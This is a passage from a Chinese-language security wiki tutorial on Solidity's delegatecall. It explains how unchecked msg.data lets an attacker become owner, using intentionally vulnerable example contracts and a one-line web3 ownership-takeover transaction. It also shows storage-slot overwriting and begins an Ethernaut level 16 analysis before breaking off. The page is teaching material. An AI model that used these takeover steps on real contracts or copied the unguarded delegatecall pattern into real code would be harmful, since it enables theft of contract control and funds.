<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <meta name="author" content="Conflux Wiki Team">
        <link rel="canonical" href="https://conflux-wiki.github.io/blockchain/ethereum/attacks/delegatecall/">
        <link rel="shortcut icon" href="../../../../img/favicon.ico">
        <title>Delegatecall - Conflux Wiki</title>
        <link href="../../../../css/bootstrap.min.css" rel="stylesheet">
        <link href="../../../../css/font-awesome.min.css" rel="stylesheet">
        <link href="../../../../css/base.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css">
        <link href="../../../../static/css/extra.css" rel="stylesheet">

        <script src="../../../../js/jquery-1.10.2.min.js" defer></script>
        <script src="../../../../js/bootstrap.min.js" defer></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
        <script>hljs.initHighlightingOnLoad();</script> 
    </head>

    <body>
        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
            <div class="container">
                <a class="navbar-brand" href="../../../..">Conflux Wiki</a>
                <!-- Expander button -->
                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
                    <span class="navbar-toggler-icon"></span>
                </button>

                <!-- Expanded navigation -->
                <div id="navbar-collapse" class="navbar-collapse collapse">
                        <!-- Main navigation -->
                        <ul class="nav navbar-nav">
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Start <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
<li>
    <a href="../../../.." class="dropdown-item">简介</a>
</li>
                                    
<li>
    <a href="../../../../usage/" class="dropdown-item">如何使用 Conflux Wiki</a>
</li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">贡献指南</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../contribute/before-contributing/" class="dropdown-item">贡献之前</a>
</li>
            
<li>
    <a href="../../../../contribute/basic-contribute-approach/" class="dropdown-item">基本贡献方式</a>
</li>
            
<li>
    <a href="../../../../contribute/documentation-requirement/" class="dropdown-item">贡献文档要求</a>
</li>
            
<li>
    <a href="../../../../contribute/translation/" class="dropdown-item">翻译</a>
</li>
    </ul>
  </li>
                                    
<li>
    <a href="../../../../discussion/" class="dropdown-item">讨论交流</a>
</li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Introduction <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
<li>
    <a href="../../../../introduction/history/" class="dropdown-item">区块链 历史</a>
</li>
                                    
<li>
    <a href="../../../../introduction/link/" class="dropdown-item">Conflux相关链接</a>
</li>
                                    
<li>
    <a href="../../../../introduction/highlight-time/" class="dropdown-item">重要时刻</a>
</li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Crypto <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
<li>
    <a href="../../../../crypto/introduction/" class="dropdown-item">密码学简介</a>
</li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">基础数学知识</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/basic/introduction/" class="dropdown-item">基础数学知识</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">古典密码</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/classical/introduction/" class="dropdown-item">古典密码简介</a>
</li>
            
<li>
    <a href="../../../../crypto/classical/monoalphabetic/" class="dropdown-item">单表代换加密</a>
</li>
            
<li>
    <a href="../../../../crypto/classical/polyalphabetic/" class="dropdown-item">多表代换加密</a>
</li>
            
<li>
    <a href="../../../../crypto/classical/others/" class="dropdown-item">其它类型加密</a>
</li>
            
<li>
    <a href="../../../../crypto/classical/summary/" class="dropdown-item">总结</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">流密码</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/streamcipher/intro/" class="dropdown-item">流密码</a>
</li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">伪随机数生成器</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/streamcipher/prng/intro/" class="dropdown-item">伪随机数生成器介绍</a>
</li>
            
<li>
    <a href="../../../../crypto/streamcipher/prng/csprng/" class="dropdown-item">密码安全伪随机数生成器</a>
</li>
            
<li>
    <a href="../../../../crypto/streamcipher/prng/problem/" class="dropdown-item">题目</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">线性同余生成器</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/streamcipher/lcg/intro/" class="dropdown-item">线性同余生成器</a>
</li>
            
<li>
    <a href="../../../../crypto/streamcipher/lcg/challenge/" class="dropdown-item">题目</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">反馈移位寄存器</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/streamcipher/fsr/intro/" class="dropdown-item">反馈移位寄存器</a>
</li>
            
<li>
    <a href="../../../../crypto/streamcipher/fsr/lfsr/" class="dropdown-item">线性反馈移位寄存器 - LFSR</a>
</li>
            
<li>
    <a href="../../../../crypto/streamcipher/fsr/nfsr/" class="dropdown-item">非线性反馈移位寄存器</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">特殊流密码</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/streamcipher/special/rc4/" class="dropdown-item">RC4</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">块加密</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/blockcipher/introduction/" class="dropdown-item">块加密</a>
</li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">ARX</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/blockcipher/arx-operations/" class="dropdown-item">ARX: Add-Rotate-Xor</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">DES</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/blockcipher/des/" class="dropdown-item">DES</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">IDEA</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/blockcipher/idea/" class="dropdown-item">IDEA</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">AES</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/blockcipher/aes/" class="dropdown-item">AES</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">Simon and Speck</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/blockcipher/simon-speck/" class="dropdown-item">Simon and Speck Block Ciphers</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">分组模式</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/blockcipher/mode/introduction/" class="dropdown-item">分组模式</a>
</li>
            
<li>
    <a href="../../../../crypto/blockcipher/mode/padding/" class="dropdown-item">填充方式</a>
</li>
            
<li>
    <a href="../../../../crypto/blockcipher/mode/ecb/" class="dropdown-item">ECB</a>
</li>
            
<li>
    <a href="../../../../crypto/blockcipher/mode/cbc/" class="dropdown-item">CBC</a>
</li>
            
<li>
    <a href="../../../../crypto/blockcipher/mode/pcbc/" class="dropdown-item">PCBC</a>
</li>
            
<li>
    <a href="../../../../crypto/blockcipher/mode/cfb/" class="dropdown-item">CFB</a>
</li>
            
<li>
    <a href="../../../../crypto/blockcipher/mode/ofb/" class="dropdown-item">OFB</a>
</li>
            
<li>
    <a href="../../../../crypto/blockcipher/mode/ctr/" class="dropdown-item">CTR</a>
</li>
            
<li>
    <a href="../../../../crypto/blockcipher/mode/padding-oracle-attack/" class="dropdown-item">Padding Oracle Attack</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">非对称加密</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/asymmetric/introduction/" class="dropdown-item">介绍</a>
</li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">RSA</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/asymmetric/rsa/rsa_theory/" class="dropdown-item">RSA 介绍</a>
</li>
            
<li>
    <a href="../../../../crypto/asymmetric/rsa/rsa_module_attack/" class="dropdown-item">模数相关攻击</a>
</li>
            
<li>
    <a href="../../../../crypto/asymmetric/rsa/rsa_e_attack/" class="dropdown-item">公钥指数相关攻击</a>
</li>
            
<li>
    <a href="../../../../crypto/asymmetric/rsa/rsa_d_attack/" class="dropdown-item">私钥 d 相关攻击</a>
</li>
            
<li>
    <a href="../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack/" class="dropdown-item">Coppersmith 相关攻击</a>
</li>
            
<li>
    <a href="../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher/" class="dropdown-item">RSA 选择明密文攻击</a>
</li>
            
<li>
    <a href="../../../../crypto/asymmetric/rsa/rsa_side_channel/" class="dropdown-item">RSA 侧信道攻击</a>
</li>
            
<li>
    <a href="../../../../crypto/asymmetric/rsa/rsa_pkcs_attack/" class="dropdown-item">Bleichenbacher's attack</a>
</li>
            
<li>
    <a href="../../../../crypto/asymmetric/rsa/rsa_complex/" class="dropdown-item">RSA 复杂题目</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">背包加密</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/asymmetric/knapsack/knapsack/" class="dropdown-item">背包加密</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">离散对数相关</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/asymmetric/discrete-log/discrete-log/" class="dropdown-item">离散对数</a>
</li>
            
<li>
    <a href="../../../../crypto/asymmetric/discrete-log/elgamal/" class="dropdown-item">ElGamal</a>
</li>
            
<li>
    <a href="../../../../crypto/asymmetric/discrete-log/ecc/" class="dropdown-item">ECC</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">格密码</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/asymmetric/lattice/overview/" class="dropdown-item">格概述</a>
</li>
            
<li>
    <a href="../../../../crypto/asymmetric/lattice/introduction/" class="dropdown-item">基本介绍</a>
</li>
            
<li>
    <a href="../../../../crypto/asymmetric/lattice/lattice-reduction/" class="dropdown-item">格基规约算法</a>
</li>
            
<li>
    <a href="../../../../crypto/asymmetric/lattice/cvp/" class="dropdown-item">CVP</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">哈希函数</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/hash/introduction/" class="dropdown-item">哈希函数</a>
</li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">MD5</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/hash/md5/" class="dropdown-item">MD5</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">SHA1</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/hash/sha1/" class="dropdown-item">SHA1</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">FNV</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/hash/fnv/" class="dropdown-item">Fowler–Noll–Vo hash function</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">Hash Attack</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/hash/attack/" class="dropdown-item">Hash Attack</a>
</li>
    </ul>
  </li>
            
<li>
    <a href="../../../../crypto/hash/complex/" class="dropdown-item">综合题目</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">数字签名</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/signature/introduction/" class="dropdown-item">数字签名</a>
</li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">RSA 数字签名</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/signature/rsa/" class="dropdown-item">RSA 数字签名</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">ElGamal 数字签名</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/signature/elgamal/" class="dropdown-item">ElGamal</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">DSA 数字签名</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/signature/dsa/" class="dropdown-item">DSA</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">攻击思想总结</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/attack-summary/attack-mode/" class="dropdown-item">简介</a>
</li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">中间相遇攻击</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/attack-summary/meet-in-the-middle/" class="dropdown-item">中间相遇攻击 - MITM</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">比特攻击</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/attack-summary/bit-attack/" class="dropdown-item">比特攻击</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">证书格式</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../crypto/certificate/introduction/" class="dropdown-item">证书格式</a>
</li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Development <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
<li>
    <a href="../../../../development/introduction/" class="dropdown-item">Conflux应用开发入门</a>
</li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">生态开发激励</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../development/incentive-guide/" class="dropdown-item">生态激励指南</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">开发工具及相关资源介绍</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../development/tools/" class="dropdown-item">开发工具</a>
</li>
            
<li>
    <a href="../../../../development/resources/" class="dropdown-item">开发资源</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">ConfluxScan教程</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../development/apply-contract-fee/" class="dropdown-item">为合约申请Conflux赞助额度（合约代付）</a>
</li>
            
<li>
    <a href="../../../../development/address-NFT/" class="dropdown-item">NFT查看器教程</a>
</li>
            
<li>
    <a href="../../../../development/register-contract-and-token-display/" class="dropdown-item">如何在Scan上注册合约和代币展示</a>
</li>
            
<li>
    <a href="../../../../development/get-lp-token-address/" class="dropdown-item">查找LP代币的合约地址</a>
</li>
            
<li>
    <a href="../../../../development/internal-transaction/" class="dropdown-item">交易分析</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">Portal钱包教程</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../development/portal/" class="dropdown-item">Portal安装配置步骤</a>
</li>
            
<li>
    <a href="../../../../development/portal-setting/" class="dropdown-item">Portal钱包常用功能解析</a>
</li>
            
<li>
    <a href="../../../../development/add-token-to-portal/" class="dropdown-item">添加CRC20代币到Portal的方法与步骤</a>
</li>
            
<li>
    <a href="../../../../development/portal-faucet/" class="dropdown-item">ConfluxPortal切换为测试网领取测试币教程</a>
</li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Ecosystem <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
<li>
    <a href="../../../../ecosystem/introduction/" class="dropdown-item">生态介绍</a>
</li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">Conflux基础生态教程</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../ecosystem/wcfx-cfx-exchange/" class="dropdown-item">WCFX与CFX代币互换</a>
</li>
            
<li>
    <a href="../../../../ecosystem/governance/" class="dropdown-item">Staking合约的质押与解质押</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">常见生态介绍及教程</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../ecosystem/tspace/" class="dropdown-item">Tspace 4.0 NFT平台</a>
</li>
            
<li>
    <a href="../../../../ecosystem/nft-box/" class="dropdown-item">NFTBox创新型资产交互平台</a>
</li>
            
<li>
    <a href="../../../../ecosystem/shuttleflow/" class="dropdown-item">Shuttleflow跨链工具</a>
</li>
            
<li>
    <a href="../../../../ecosystem/moonswap/" class="dropdown-item">moonswap生态</a>
</li>
            
<li>
    <a href="../../../../ecosystem/phantom/" class="dropdown-item">Phantom协议</a>
</li>
            
<li>
    <a href="../../../../ecosystem/dan/" class="dropdown-item">炼丹西游</a>
</li>
            
<li>
    <a href="../../../../ecosystem/guguo/" class="dropdown-item">古国序列</a>
</li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Web <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
<li>
    <a href="../../../../web/introduction/" class="dropdown-item">Web 简介</a>
</li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">SQL 注入</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../web/sqli/" class="dropdown-item">SQL 注入</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">XSS 跨站脚本攻击</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../web/xss/" class="dropdown-item">XSS</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">CSRF 跨站请求伪造</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../web/csrf/" class="dropdown-item">CSRF</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">SSRF 服务端请求伪造</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../web/ssrf/" class="dropdown-item">SSRF</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">PHP 代码审计</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../../web/php/php/" class="dropdown-item">PHP 代码审计</a>
</li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown active">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">BlockChain <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
<li>
    <a href="../../../introduction/" class="dropdown-item">BlockChain Security Overview</a>
</li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">Ethereum Security</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../introduction/" class="dropdown-item">Ethereum Overview</a>
</li>
            
<li>
    <a href="../../basics/" class="dropdown-item">Ethereum Basics</a>
</li>
            
<li>
    <a href="../../selector-encoding/" class="dropdown-item">Function Selector and Argument Encoding</a>
</li>
            
<li>
    <a href="../../storage/" class="dropdown-item">Ethereum Storage</a>
</li>
            
<li>
    <a href="../../opcodes/" class="dropdown-item">Ethereum Opcodes</a>
</li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">Known Attacks</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../introduction/" class="dropdown-item">Introduction</a>
</li>
            
<li>
    <a href="../re-entrancy/" class="dropdown-item">Re-Entrancy</a>
</li>
            
<li>
    <a href="../overflow-underflow/" class="dropdown-item">Integer Overflow and Underflow</a>
</li>
            
<li>
    <a href="../randomness/" class="dropdown-item">Randomness</a>
</li>
            
<li>
    <a href="../airdrop-hunting/" class="dropdown-item">Airdrop Hunting</a>
</li>
            
<li>
    <a href="../shortaddress/" class="dropdown-item">Short Address Attack</a>
</li>
            
<li>
    <a href="./" class="dropdown-item active">Delegatecall</a>
</li>
            
<li>
    <a href="../uninitialized-storage-pointer/" class="dropdown-item">Uninitialized Storage Pointer</a>
</li>
            
<li>
    <a href="../arbitrarywrite/" class="dropdown-item">Arbitrary Writing</a>
</li>
            
<li>
    <a href="../create2/" class="dropdown-item">CREATE2</a>
</li>
            
<li>
    <a href="../jump-oriented-programming/" class="dropdown-item">Jump Oriented Programming</a>
</li>
    </ul>
  </li>
            
<li>
    <a href="../../reverse/" class="dropdown-item">Smart Contract Reverse</a>
</li>
            
<li>
    <a href="../../challenges/" class="dropdown-item">区块链比赛题目</a>
</li>
            
<li>
    <a href="../../resources/" class="dropdown-item">学习资源</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">Public Blockchain Security</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../publicblockchain/introduction/" class="dropdown-item">Public Blockchain Security Overview</a>
</li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">NFT <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
<li>
    <a href="../../../../nft/introduction/" class="dropdown-item">初识NFT</a>
</li>
                                </ul>
                            </li>
                        </ul>

                    <ul class="nav navbar-nav ml-auto">
                        <li class="nav-item">
                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
                                <i class="fa fa-search"></i> Search
                            </a>
                        </li>
                            <li class="nav-item">
                                <a rel="prev" href="../shortaddress/" class="nav-link">
                                    <i class="fa fa-arrow-left"></i> Previous
                                </a>
                            </li>
                            <li class="nav-item">
                                <a rel="next" href="../uninitialized-storage-pointer/" class="nav-link">
                                    Next <i class="fa fa-arrow-right"></i>
                                </a>
                            </li>
                            <li class="nav-item">
                                <a href="https://github.com/conflux-wiki/conflux-wiki/blob/master/docs/zh/docs/blockchain/ethereum/attacks/delegatecall.md" class="nav-link">Edit on conflux-wiki/conflux-wiki</a>
                            </li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="container">
            <div class="row">
                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
    <div class="navbar-header">
        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
            <span class="fa fa-angle-down"></span>
        </button>
    </div>

    
    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
        <ul class="nav flex-column">
            
            <li class="nav-item" data-level="1"><a href="#delegatecall" class="nav-link">Delegatecall</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#_1" class="nav-link">原理</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#_8" class="nav-link">例子</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#_9" class="nav-link">题目</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
        </ul>
    </div>
</div></div>
                    <div class="col-md-9" role="main">

<h1 id="delegatecall">Delegatecall<a class="headerlink" href="#delegatecall" title="Permanent link">&para;</a></h1>
<blockquote>
<p>There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.</p>
</blockquote>
<h2 id="_1">原理<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<h3 id="_2">三种调用函数<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
<p>在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式。</p>
<h4 id="_3">调用模型<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
<pre class="highlight"><code>&lt;address&gt;.call(...) returns (bool)
&lt;address&gt;.callcode(...) returns (bool)
&lt;address&gt;.delegatecall(...) returns (bool)</code></pre>
<p>这些函数提供了灵活的方式与合约进行交互，并且可以接受任何长度、任何类型的参数，其传入的参数会被填充至 32 字节最后拼接为一个字符串序列，由 EVM 解析执行。</p>
<p>在函数调用的过程中，Solidity 中的内置变量 <code>msg</code> 会随着调用的发起而改变，<code>msg</code> 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。</p>
<h4 id="_4">异同点<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
<ul>
<li>call: 调用后内置变量 <code>msg</code> 的值会修改为调用者，执行环境为被调用者的运行环境</li>
<li>delegatecall: 调用后内置变量 <code>msg</code> 的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）</li>
<li>callcode: 调用后内置变量 <code>msg</code> 的值会修改为调用者，但执行环境为调用者的运行环境</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Warning: "callcode" has been deprecated in favour of "delegatecall"</p>
</div>
<h3 id="delegatecall_1">Delegatecall 滥用<a class="headerlink" href="#delegatecall_1" title="Permanent link">&para;</a></h3>
<h4 id="_5">设计初衷<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
<ul>
<li>函数原型 <code>&lt;address&gt;.delegatecall(...) returns (bool)</code></li>
<li>函数设计的目的是为了使用给定地址的代码，其他信息则使用当前合约（如存储、余额等）</li>
<li>某种程度上也是为了代码的复用</li>
</ul>
<h4 id="_6">威胁分析<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
<p>参考函数原型，我们知道，delegatecall 调用有 <code>address</code> 和 <code>msg.data</code> 两个参数</p>
<ul>
<li>若 <code>msg.data</code> 可控，则可调用 <code>address</code> 处任意函数</li>
</ul>
<pre class="highlight"><code class="language-solidity">pragma solidity ^0.4.18;

contract Delegate {

    address public owner;

    function Delegate(address _owner) public {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {

    address public owner;
    Delegate delegate;

    function Delegation(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    function() public {
        if(delegate.delegatecall(msg.data)) {
            this;
        }
    }
}</code></pre>
<p>对于这个例子，攻击者如何成为 owner 呢？</p>
<p>其实我们只需调用 Delegation 的假 <code>pwn()</code> 即可，这样就会触发 Delegation 的 <code>fallback</code>，这样 <code>pwn</code> 的函数签名哈希就会放在 <code>msg.data[0:4]</code> 了，这样就会只需 delegate 的 <code>pwn()</code> 把 owner 变成自己，如下所示即可（这就是因为 <code>msg.data</code> 可控导致的）</p>
<pre class="highlight"><code>contract.sendTransaction({data: web3.sha3("pwn()").slice(0,10)})</code></pre>
<ul>
<li>若 <code>msg.data</code> 和 <code>address</code> 都可控，则可调用任意 <code>address</code> 处的任意函数</li>
</ul>
<p>同理，只不过额外加了 <code>address</code> 是可控的这个条件，不再作分析</p>
<h4 id="_7">原因分析<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
<pre class="highlight"><code class="language-solidity">pragma solidity ^0.4.23;

contract A {
    address public c;
    address public b;

    function test() public returns (address a) {
        a = address(this);
        b = a;
    }
}

contract B {
    address public b;
    address public c;

    function withdelegatecall(address testaddress) public {
        testaddress.delegatecall(bytes4(keccak256("test()")));
    }
}</code></pre>
<p>来看上面这个例子，假设合约 A 部署后地址为 address_a，合约 B 部署后地址为 address_b，使用 外部账户 C 调用 withdelegatecall(address_a)，address_a 和 address_b 中的 b、c 变量分别是多少？结果如下</p>
<p>address_a 合约中，c = 0，b = 0；address_b 合约中，b = 0，c = address_b</p>
<p>修改的不是 B 合约中的 b 变量，而是修改了 B 合约中的 c 变量</p>
<p><img alt="delegatecall" src="../figure/delegatecall.png" /></p>
<p>sstore 即访存指令，可以看到写入的是 1 号存储位，1号存储位 在 B 合约中即对应变量 c，在 A 合约中则对应变量 b，所以事实上调用 delegatecall 来使用 Storage 变量时依据并不是变量名，而是变量的存储位，这样的话我们就可以达到覆盖相关变量的目的。</p>
<h2 id="_8">例子<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
<h3 id="source">Source<a class="headerlink" href="#source" title="Permanent link">&para;</a></h3>
<p><a href="https://ethernaut.openzeppelin.com/">ethernaut</a> 第 16 题</p>
<h3 id="analyse">Analyse<a class="headerlink" href="#analyse" title="Permanent link">&para;</a></h3>
<ul>
<li>我们调用 Preservation 的 <code>setFirstTime</code> 函数实际通过 <code>delegatecall</code> 执行了 LibraryContract 的 <code>setTime</code> 函数，修改了 slot 1 ，也就是修改了 timeZone1Library 变量</li>
